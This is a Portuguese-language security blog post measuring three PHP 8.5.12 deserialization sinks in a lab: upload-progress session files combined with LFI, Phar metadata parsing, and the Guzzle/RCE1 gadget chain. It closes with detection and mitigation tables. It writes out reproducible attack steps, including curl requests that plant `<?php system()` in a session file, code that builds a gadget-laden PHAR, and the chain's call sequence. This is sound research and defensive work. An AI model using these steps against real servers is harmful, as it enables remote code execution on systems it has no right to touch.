---
layout: post
title: "Sinks de Desserialização no PHP 8.5: Session File, LFI e Phar"
date: 2026-11-05 10:00:00 -0300
categories: [seguranca, php, exploit]
tags: [php, desserializacao, lfi, phar, cve-2026-115560, cve-2026-109618]
description: "Três sinks de aplicação que transformam upload, LFI e metadata de PHAR em execução no PHP 8.5.12 — o que ainda funciona, o que é técnica antiga e o que não é CVE."
---

*Nota técnica de engenharia de exploit. Nenhuma técnica aqui é nova; o que trago são medições, limites e reprodutibilidade.*

---

## Contexto

Durante a construção do exploit do PHP2Shell, testei as mesmas técnicas contra várias imagens — Debian, Alpine, Distroless, Apache, FPM — não atrás de uma técnica nova, mas para medir o que cada ambiente ainda permite. A pergunta era simples: alguma mitigação, proposital ou efeito colateral de configuração, está no caminho?

A resposta curta é que não há CVE nova aqui. As técnicas são conhecidas; o que muda é o sink, a configuração e o que o container tem — ou não tem — disponível. Isso talvez vire um post, talvez um artigo na tramoia.sh. Talvez.

O PHP teve, em outubro de 2026, duas CVEs na mesma família — e uma terceira ligada ao mesmo mecanismo de sessão:

| CVE | Tipo | Efeito |
|:--|:--|:--|
| **CVE-2026-109618** | use-after-free no parser multipart/sessão | corrupção e, com heap grooming, execução |
| **CVE-2026-109619** | OOM no `php_hash_environment()` | DoS; em alguns cenários, estado obsoleto |
| **CVE-2026-115560** | troca de `session.serialize_handler` + upload progress | injeção de objeto; RCE com gadget |

As três são do **PHP**. O que este texto discute são os **sinks da aplicação** que fazem a ponte entre “objeto desserializado” e “comando executado”:

1. **session file + LFI**;
2. **Phar deserialization**;
3. **gadget chain** em uma dependência real.

Nenhum dos três é uma CVE do PHP. Eles são **CWE-98/CWE-502** da aplicação, ou uma técnica de exploração. É exatamente a diferença entre “a falha” e “o caminho até o `system()`”.

---

## O que é um sink, afinal

Desserializar um objeto não executa código por si só. O PHP precisa de uma classe já carregada cujos métodos mágicos façam algo perigoso:

| Método | Quando roda |
|:--|:--|
| `__wakeup()` | ao terminar de desserializar |
| `__unserialize()` | idem, no formato novo |
| `__destruct()` | na destruição do objeto, inclusive em falha de decode |
| `__toString()` | na conversão para string |
| `__call()` / `__invoke()` | chamada de método/função no objeto |

O atacante controla **propriedades**, e o PHP chama os métodos na ordem que o código da aplicação permitir. Isso é POP chain — *Property-Oriented Programming*.

O exemplo mínimo que usei no lab:

```php
class Gadget {
    public function __wakeup() {
        system('id > /out/p115560');
    }
}
```

O payload é literalmente:

```text
O:6:"Gadget":0:{}
```

O `system()` está no gadget, não no payload.

---

## Sink 1 — session file + LFI

O primeiro sink não é uma falha do PHP. É a combinação de um recurso legítimo — o upload progress — com uma falha de aplicação: um `include` de caminho controlável.

### Como o PHP grava o progresso

Quando `session.upload_progress.enabled` está ligado, o PHP se pendura no parser multipart. Ao ver o campo cujo nome é definido em `session.upload_progress.name` (por padrão `PHP_SESSION_UPLOAD_PROGRESS`), ele monta um registro de progresso e grava esse registro no **arquivo de sessão** antes de a aplicação rodar.

O caminho do arquivo vem de `session.save_path`; o nome vem do ID de sessão. Em uma instalação comum:

```text
/tmp/sess_<PHPSESSID>
```

O ID é escolhido pelo cliente no cookie `PHPSESSID`. Se `session.use_strict_mode=0`, o PHP aceita um ID que ainda não existe e cria a sessão ali. Com `strict_mode=1`, o ID precisa ser válido ou o fluxo muda.

O detalhe que faz a técnica funcionar é que o valor do campo de progresso entra no arquivo de sessão. Dependendo do `session.serialize_handler`, ele aparece como parte da chave do registro ou dentro do valor serializado — mas o conteúdo controlado chega ao arquivo. E o arquivo de sessão **não precisa ser um script PHP**.

### Por que o `include` executa um arquivo de sessão

O interpretador PHP não exige que o arquivo tenha extensão `.php`. Quando um `include` lê um arquivo, ele procura a tag de abertura `<?php` em qualquer posição. Ao encontrar, muda para o modo PHP e executa o trecho até `?>`; o resto continua sendo saída.

O arquivo de sessão é texto. Se o valor que o atacante colocou no campo de progresso contém:

```php
<?php system('id > /out/p'); ?>
```

o `include` encontra essa tag e executa, mesmo que o resto do arquivo seja uma estrutura serializada.

O fluxo completo:

```text
POST /upload.php
  Cookie: PHPSESSID=<id>
  PHP_SESSION_UPLOAD_PROGRESS = <?php system('id > /out/p'); ?>
  file = <qualquer arquivo>

  → /tmp/sess_<id> é criado pelo PHP, antes do script da aplicação

GET /app.php?f=/tmp/sess_<id>
  → include($_GET['f'])
  → o parser encontra <?php no arquivo e executa
```

Repare que o endpoint que recebe o upload **não precisa** chamar `session_start()`. O progresso é gravado pelo próprio PHP. O que a aplicação precisa ter é o segundo endpoint, com LFI.

### Pré-condições

| Requisito | Por quê |
|:--|:--|
| `session.upload_progress.enabled=On` | sem isso, o PHP não grava o progresso |
| `session.upload_progress.cleanup=Off` | com `On`, o PHP limpa o registro cedo; o payload pode não estar mais no arquivo na hora do include |
| `session.save_path` previsível e legível | é o caminho que a LFI vai abrir |
| ID de sessão controlável | o cookie `PHPSESSID` vira o nome do arquivo |
| `include`/`require` com caminho do usuário | é o sink que executa o conteúdo |
| Permissão de leitura | o usuário do PHP precisa ler o arquivo de sessão |

Sem o sink de LFI, o upload progress sozinho não executa nada. Ele só grava um arquivo.

### O que medi

| Stack | Resultado | Prova |
|:--|:--|:--|
| Apache 8.5.12 + mod_php | **1/1** | `uid=33(www-data)` |
| FPM 8.5.12 + nginx | **1/1** | `uid=33(www-data)` |
| Config | `cleanup=Off`, `save_path=/tmp` | — |

No lab, `PHPSESSID=p2s-orch-lfi` virou `/tmp/sess_p2s-orch-lfi`. A LFI foi um `include($_GET['f'])` de propósito, para isolar o sink.

### O detalhe do `curl`

Um erro de ferramenta quase escondeu o resultado: `curl -F` interpreta um valor que começa com `<` como **nome de arquivo** para ler. Como o payload começa com `<?php`, o request falhava com `curl: (26)` e o arquivo de sessão nem era criado.

Para mandar o payload como string, o campo precisa de `--form-string`:

```bash
curl --form-string \
  "PHP_SESSION_UPLOAD_PROGRESS=<?php system('id > /out/p'); ?>" \
  -F "file=@payload.txt;filename=x.txt" \
  -b "PHPSESSID=<id>" \
  http://127.0.0.1:8080/upload.php
```

Depois:

```bash
curl -b "PHPSESSID=<id>" \
  "http://127.0.0.1:8080/app.php?f=/tmp/sess_<id>"
```

### Isto é novo?

Não. A combinação “upload progress + LFI” é conhecida há anos. O que muda é o sink da aplicação e a configuração do PHP. Em 8.5.12, com `cleanup=Off` e `save_path` previsível, continua funcionando.

O que vale documentar é o **contrato**: sem LFI, não há execução; com LFI e as três configurações, o PHP entrega o arquivo pronto para ser incluído.

---

## Sink 2 — Phar deserialization

O segundo sink também é antigo, mas costuma ser mal entendido. Não é “abrir um arquivo PHAR”; é fazer o PHP **parsear o metadata** de um PHAR.

### O que é um PHAR

PHAR é o formato de arquivo PHP: um stub executável no começo, um manifesto com metadados e os arquivos internos. O manifesto pode carregar **metadata** arbitrário, e o PHP serializa esse metadata quando o arquivo é criado.

No lab, o PHAR foi construído assim:

```php
$p = new Phar('/var/www/html/payload.phar');
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata(new Gadget());
```

O `setMetadata(new Gadget())` grava a representação serializada do objeto dentro do PHAR. Não é um payload separado; é o metadata do arquivo.

### Quando o metadata é desserializado

A desserialização acontece quando o PHP abre o arquivo pelo **stream wrapper** `phar://`. Não é qualquer leitura do arquivo no disco; é uma operação que passa pelo wrapper.

Exemplos de operações que podem tocar no wrapper:

```php
file_exists('phar:///uploads/payload.phar/x.txt');
file_get_contents('phar:///uploads/payload.phar/x.txt');
getimagesize('phar:///uploads/payload.phar/x.txt');
new Phar('/uploads/payload.phar');
```

O conjunto exato depende da versão e do caminho de código. No nosso teste, `file_exists('phar://...')` **não** disparou o metadata; `new Phar(...)->getMetadata()` disparou. Isso mostra que o sink importa tanto quanto o arquivo.

### O que acontece na desserialização

Quando o PHP lê o metadata, ele chama o desserializador. Se a classe do objeto estiver disponível — carregada ou via autoload — os métodos mágicos rodam. No lab, a classe `Gadget` tinha `__wakeup()`:

```php
class Gadget {
    public function __wakeup() {
        system('id >> /out/p-phar');
    }
}
```

O endpoint era:

```php
$p = new Phar($_GET['f']);
$m = $p->getMetadata();
```

E o resultado:

| Item | Valor |
|:--|:--|
| Resposta | `phar=Gadget` |
| Prova | `PHAR_WAKEUP` + `uid=33(www-data)` |
| Arquivo | 143 B |

O `__wakeup()` executou durante o parse do metadata, antes de o endpoint usar o objeto.

### Pré-condições

| Requisito | Por quê |
|:--|:--|
| Arquivo PHAR controlado pelo atacante | o metadata é o payload |
| Operação `phar://` real na aplicação | sem wrapper, não há parse |
| Classe-gadget carregada ou autoloadable | o objeto precisa existir no processo |
| Caminho do arquivo controlável | upload, download, importação, cache |
| `phar.readonly=1` no alvo não impede leitura | ele bloqueia criação/edição, não o parse |

O `phar.readonly=0` que usei foi só para **criar** o arquivo no build. O alvo pode ter `readonly=1` e ainda desserializar o metadata.

### Isto é novo?

Também não. Sam Thomas apresentou Phar deserialization em 2018; o `phpggc` popularizou a geração de cadeias. O que fiz foi medir o comportamento no 8.5.12 e documentar o limite: **sem operação `phar://` real, não há desserialização**.

O ponto prático é que muita gente acha que “subir um `.phar`” basta. Não basta. Precisa existir um ponto na aplicação que trate aquele caminho como PHAR.

---

## Sink 3 — gadget chain real

Aqui a pergunta era outra: o gadget didático não prova nada; uma dependência real executa?

### O que é uma POP chain

Uma POP chain é uma sequência de métodos mágicos e chamadas internas que transforma “propriedades controladas” em “função chamada”. O atacante não injeta código; ele escolhe **objetos e propriedades** que o código já tem, e o PHP executa os métodos na ordem que a aplicação permitir.

Isso é diferente de uma falha de memória. Não há corrupção de heap, não há ROP. É o comportamento normal do PHP sendo usado como uma máquina de chamadas.

### A cadeia do Guzzle

Montei uma aplicação com **Guzzle 6.3.3** e **psr7 1.4.2**, versões antigas mas ainda presentes em projetos legados. Usei a cadeia `Guzzle/RCE1` do `phpggc`:

```text
FnStream::__destruct
  → call_user_func($this->_fn_close)
  → HandlerStack::resolve
  → $fn[0]($prev)
  → system($command)
```

Em termos simples:

1. `FnStream` guarda um array de métodos e um `_fn_close`.
2. No `__destruct`, ele chama `_fn_close`.
3. O `_fn_close` aponta para `[HandlerStack, 'resolve']`.
4. `HandlerStack::resolve()` percorre a pilha e chama o primeiro item como função.
5. O item é `system`, com o comando escolhido.

Payload de 387 B, com **NUL bytes** nas propriedades privadas. O `phpggc` gera, mas o payload é apenas um objeto serializado; a execução está na biblioteca.

### O que medi

| Execução | Resultado |
|:--|:--|
| CLI, PHP 8.5.12 | **`uid=0(root)`** |
| Web via CVE-2026-115560 | ❌ `Failed to decode session object` |

A execução no CLI prova que a cadeia é real: o `system` rodou e o arquivo de prova apareceu. Não é só um erro de desserialização.

A integração web falhou por **transporte**, não por gadget: o corpo multipart precisa preservar os NULs do payload serializado. O `curl --form-string` não serve para bytes arbitrários; é preciso montar o corpo e enviar byte a byte. O `session_start` do consumidor respondeu `Failed to decode session object` nesta rodada, então não houve prova web.

### Pré-condições

| Requisito | Por quê |
|:--|:--|
| Aplicação desserializa dado do usuário | `unserialize`, `session_decode` ou CVE-2026-115560 |
| Classe da cadeia carregada/autoloadable | `FnStream`, `HandlerStack`, `Psr\Http\Message\StreamInterface` |
| Versões vulneráveis da dependência | Guzzle 6.0–6.3.2 e psr7 < 1.5.0 |
| Payload íntegro | NULs preservados no corpo |
| `system` disponível | `disable_functions` não bloqueia |

### Isto é novo?

Não. O `phpggc` tem essa cadeia pública; Guzzle 6.3.3 é uma versão antiga e conhecida. O que fiz foi provar que ela funciona no PHP 8.5.12 e documentar onde a integração web para.

Isso também mostra por que “gadget didático” é insuficiente: a classe `Gadget` prova o conceito, mas não prova que uma dependência real entrega execução. A cadeia do Guzzle prova.

---

## O que o patch não cobre

Duas coisas apareceram no caminho e não têm CVE atribuída:

### UAF de `unserialize` na 8.5.12

Com `USE_ZEND_ALLOC=0` e Valgrind, o `var_destroy()` libera o bloco de `var_entries` (8.160 B) **antes** de rodar `__destruct`. Um destructor que reentra `unserialize()` usa o `var_hash` liberado.

Medição:

| Item | Resultado |
|:--|:--|
| Rodadas | **3/3** |
| Por rodada | 4 `Invalid read` + 2 `Invalid write` |
| `R:1500` | lê o slot 481 dentro do bloco liberado |
| Spray de 1.000 strings | processo sobrevive, mas `used=0`; sem controle |
| RCE | ❌ não demonstrado |

É **corrupção de memória**, não execução. O `php-src#24481` corrige no fonte; não vi release com o fix na data desta medição.

### SimpleXML double free nos releases de segurança

O patch de 8.4.27/8.5.12 mudou o GC. Um objeto SimpleXML convertido por `json_encode()`, `(array)` ou `get_object_vars()` e coletado em ciclo libera a tabela de propriedades duas vezes.

| Build | Resultado |
|:--|:--|
| 8.4.26 | `done`, exit 0 |
| 8.4.27 | `free(): double free detected in tcache 2`, exit 139 |
| 8.5.12 | idem |

É **DoS**, não RCE. Também sem CVE na medição.

---

## Detecção

| Sinal | Onde olhar |
|:--|:--|
| `PHP_SESSION_UPLOAD_PROGRESS` em request | WAF, proxy, logs de acesso |
| arquivo `sess_*` sendo incluído | logs de aplicação, `open_basedir` |
| `phar://` em parâmetro | logs, SAST, revisão de `include`/`file_get_contents` |
| `unserialize()` com dado do usuário | SAST e revisão de código |
| objeto de classe de framework em sessão | monitoramento de sessão, integridade |
| `execve`/`system` após request | EDR, auditd, Falco |

## Mitigação

| Controle | Efeito |
|:--|:--|
| `session.upload_progress.cleanup=On` | remove o arquivo de progresso cedo |
| `session.save_path` fora do webroot | quebra o `include` direto |
| `open_basedir` | limita o alcance da LFI |
| não usar `include` com caminho do usuário | elimina o sink |
| `phar.readonly=1` | impede criar PHAR; leitura ainda é possível |
| não desserializar dado não confiável | elimina a classe inteira |
| `unserialize(..., ['allowed_classes' => false])` | reduz gadget chains |
| atualizar PHP | cobre 109618/109619/115560 quando o release estiver disponível |

WAF ajuda, mas não substitui o sink corrigido. A assinatura muda; o `include` dinâmico não.

---

## Conclusão

O que existe hoje, medido:

| Achado | CVE | Executa? |
|:--|:--|:--:|
| RCE 8.4 Debian/Apache, 18 builds | 109618/109619 | ✅ |
| Distroless Apache 8.4.26 | 109618/109619 | ✅ |
| CVE-2026-115560 com gadget | 115560 | ✅ |
| 8.5.10 lab | 109618/109619 | ✅ (lab) |
| LFI + session file | — | ✅ (app) |
| Phar metadata | — | ✅ (app) |
| Guzzle 6.3.3 | — | ✅ (CLI) |
| UAF de `unserialize` | — | ❌ |
| SimpleXML pós-patch | — | ❌ (DoS) |

Se você só puder corrigir uma coisa, corrija o `include`. Se puder corrigir duas, tire o `unserialize` do caminho do usuário.

## Referências

- Advisory do PHP de 23/10/2026: [php.net/archive/2026.php#2026-10-23-1](https://www.php.net/archive/2026.php#2026-10-23-1)
- Sam Thomas, *It's a PHP Unserialization Vulnerability Jim, but not as we know it* (Black Hat 2018): [PDF](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-Phar-Fetched-Reality.pdf)
- `phpggc` — biblioteca de gadget chains: [github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)
- Vickie Li, *Diving Into Unserialize() POP Chains*: [Medium](https://vickieli.medium.com/diving-into-unserialize-pop-chains-35bc1141b69a)
- OWASP WSTG — teste de LFI: [owasp.org](https://owasp.org/www-project-web-security-testing-guide/)
